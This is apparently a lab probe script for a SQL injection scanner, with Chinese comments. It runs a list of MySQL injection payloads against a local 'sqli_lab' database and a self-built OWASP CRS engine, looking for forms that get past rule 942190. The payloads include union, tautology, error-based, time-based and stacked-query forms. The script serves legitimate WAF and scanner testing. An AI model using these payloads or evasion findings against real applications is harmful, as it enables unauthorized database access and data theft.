// ============================================================================
// e2e/waf-real/probe-nounion.mjs —— §I 第 1 条探针（第四版）：绕开 union 这个"词"
//
// 前三版结论（已可定论）：
//   · 拦我们的是 942190（PL1），不是 942361（PL2，起始形状）。后者是 CRS 里
//     更**松**的兄弟规则，压根不是拦住 UNION SELECT 的那道闸；
//   · 942190 带 `t:removeCommentsChar`，所有注释填充在匹配前就被删掉，故 /xx/ 全线失效；
//   · 非 ASCII 空白 MySQL 不认，这条路物理上不通。
//   → 「改起始形状」在 942190 面前毫无意义：它不看起始，只看 union 与 select 的相邻。
//
// 所以本版换最后一轴：**用 MySQL 里语义等价、但不含 `union...select` 子串的写法**。
// 严格意义上这不是"union 技术位"，而是「同一格能不能拿到等价数据的能力位」——
// 需要如实记录为「union 拿不回，但 <替代技术> 可拿回」。
// ============================================================================
import { createRequire } from 'node:module';
const require = createRequire(new URL('../../server/package.json', import.meta.url));
const mysql = require('mysql2/promise');
const { evaluate } = await import(new URL('./crs-engine.js', import.meta.url).href);

const DB = process.env.MYSQL_DATABASE || 'sqli_lab';
const POOL = mysql.createPool({
  host: process.env.MYSQL_HOST ?? '127.0.0.1',
  port: Number(process.env.MYSQL_PORT) || 3306,
  user: process.env.MYSQL_USER ?? 'root',
  password: process.env.MYSQL_PASSWORD ?? 'root',
  database: DB,
  multipleStatements: true,
});

const MARKER = 'SQLISCANNEROK';

// 目标：在 `WHERE id=<INJECT>` 里拿到 users 的全量行（union 的典型用途）
// 与「取回标记值」等价的验收：能读出本不属于 id=1 的行
const CANDIDATES = [
  // —— 对照：原式 union ——
  { label: 'UNION SELECT(对照)', inject: `1 UNION SELECT 999,'${MARKER}'-- -`, kind: 'union' },

  // —— 1. 布尔/比较膨胀：OR 恒真，把整表拉出来 ——
  { label: 'OR 1=1', inject: `1 OR 1=1-- -`, kind: 'boolean' },
  { label: 'OR-1=-1', inject: `1 OR -1=-1-- -`, kind: 'boolean' },
  { label: '||1=1', inject: `1 || 1=1-- -`, kind: 'boolean' },
  { label: 'OR 0x1=0x1', inject: `1 OR 0x1=0x1-- -`, kind: 'boolean' },

  // —— 2. 子查询读外数据（不用 union 关键字）——
  { label: 'OR(SELECT)', inject: `1 OR (SELECT COUNT(*) FROM users)>0-- -`, kind: 'subquery' },

  // —— 3. 报错型：concat 版本号 ——
  { label: 'AND extractvalue', inject: `1 AND extractvalue(1,concat(0x7e,version()))-- -`, kind: 'error' },
  { label: 'AND updatexml', inject: `1 AND updatexml(1,concat(0x7e,version()),1)-- -`, kind: 'error' },
  { label: 'AND GTID_SUBSET', inject: `1 AND GTID_SUBSET(concat(0x7e,version()),1)-- -`, kind: 'error' },
  { label: 'AND (SELECT 1/0)', inject: `1 AND (SELECT 1 FROM(SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM users GROUP BY x)a)-- -`, kind: 'error' },

  // —— 4. 时间盲注（不含 union）——
  { label: 'AND SLEEP', inject: `1 AND SLEEP(0)-- -`, kind: 'time' },
  { label: 'AND IF(SLEEP)', inject: `1 AND IF(1=1,SLEEP(0),0)-- -`, kind: 'time' },
  { label: 'AND BENCHMARK', inject: `1 AND BENCHMARK(1,MD5(1))-- -`, kind: 'time' },
  { label: 'AND heavy query', inject: `1 AND (SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B)>0-- -`, kind: 'time' },

  // —— 5. 堆叠（需 multipleStatements，靶场开了）——
  { label: ';SELECT', inject: `1;SELECT 999,'${MARKER}'-- -`, kind: 'stacked' },

  // —— 6. union 变体：换关键字大小写/别名，验证 942190 是否是"唯一墙" ——
  { label: 'UNION/**/ALL', inject: `1 UNION ALL SELECT 999,'${MARKER}'-- -`, kind: 'union' },
  { label: 'UNION(SELECT)', inject: `1 UNION(SELECT 999,'${MARKER}')-- -`, kind: 'union' },
];

async function tryExec(inject) {
  const sql = `SELECT id,username FROM users WHERE id=${inject}`;
  try {
    const [rows] = await POOL.query(sql);
    const names = rows.map((r) => r.username);
    return { ok: true, rows, n: rows.length, gotMarker: names.includes(MARKER), names };
  } catch (e) {
    return { ok: false, err: e.message.slice(0, 58) };
  }
}

function crs(inject) {
  return evaluate({
    uri: '/num',
    queryString: `id=${encodeURIComponent(inject)}`,
    args: { id: inject },
    cookies: {},
    headers: {},
  });
}

console.log('='.repeat(96));
console.log('§I 第四版：绕开 union 字面量的等价能力探针（CRS 自实现执行器 / 真库 ' + DB + '）');
console.log('='.repeat(96));
console.log('');
console.log(`${'形态'.padEnd(22)} ${'CRS'.padEnd(12)} ${'技术'.padEnd(10)} ${'MySQL'.padEnd(20)} 读回（行数 / 标记）`);
console.log('-'.repeat(96));

const usable = [];
for (const c of CANDIDATES) {
  const v = crs(c.inject);
  const r = await tryExec(c.inject);
  const beyondOne = r.ok && (r.n > 1 || r.gotMarker);
  const myTxt = !r.ok ? '语法错' : `${r.n} 行${r.gotMarker ? ' 含标记' : ''}`;
  const win = !v.blocked && beyondOne;
  if (win) usable.push({ ...c, verdict: v, rows: r.n, gotMarker: r.gotMarker });

  console.log(
    `${(win ? '★ ' : '  ') + c.label.padEnd(20)} ${(v.blocked ? `拦${v.ruleId}` : '放').padEnd(12)} ${c.kind.padEnd(10)} ${myTxt.padEnd(20)} ${r.ok ? (r.names || []).slice(0, 4).join(',') : r.err}`
  );
}

console.log('');
console.log('='.repeat(96));
console.log(`「CRS 放行 + MySQL 拿到越权数据」的形态：${usable.length}`);
for (const u of usable) {
  console.log(`  ★ ${u.label.padEnd(22)} [${u.kind}] → ${u.rows} 行${u.gotMarker ? ' + 标记值' : ''}`);
}
console.log('');
const byKind = {};
for (const u of usable) byKind[u.kind] = (byKind[u.kind] || 0) + 1;
console.log('按技术分类：', JSON.stringify(byKind));
console.log('='.repeat(96));

await POOL.end();
